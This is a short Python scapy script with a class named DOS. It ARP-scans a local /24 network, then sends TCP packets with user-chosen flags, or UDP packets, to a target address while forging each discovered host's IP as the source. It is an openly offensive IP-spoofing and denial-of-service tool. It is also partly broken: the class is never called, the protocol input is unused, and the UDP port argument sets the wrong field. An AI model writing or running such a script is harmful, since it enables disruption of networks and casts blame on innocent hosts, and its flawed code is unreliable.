from scapy.all import TCP, IP, sr1, conf, Ether, ARP, srp, UDP

dstaddress = input('Destination address: ')
flag = input('Flag: ')
attackprotocol = input('Choose attack protocol')

class DOS:
    def getIpAddresses(self, target_ip):
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
        result = srp(arp_request, timeout=2, iface=None, verbose=False)[0]
        ipaddresses = [res[1].psrc for res in result]
        return ipaddresses

    def sendsynstcp(self):
        ips = self.getIpAddresses("192.168.1.0/24")

        for ip in ips:
            p = sr1(IP(src=ip, dst=dstaddress)/TCP(flags=flag))
            p.show()
    
    def sendudp(self,dport):
        ips = self.getIpAddresses("192.168.1.0/24")

        for ip in ips:
            p = sr1(IP(src=ip, dst=dstaddress)/UDP(dport))
            p.show()
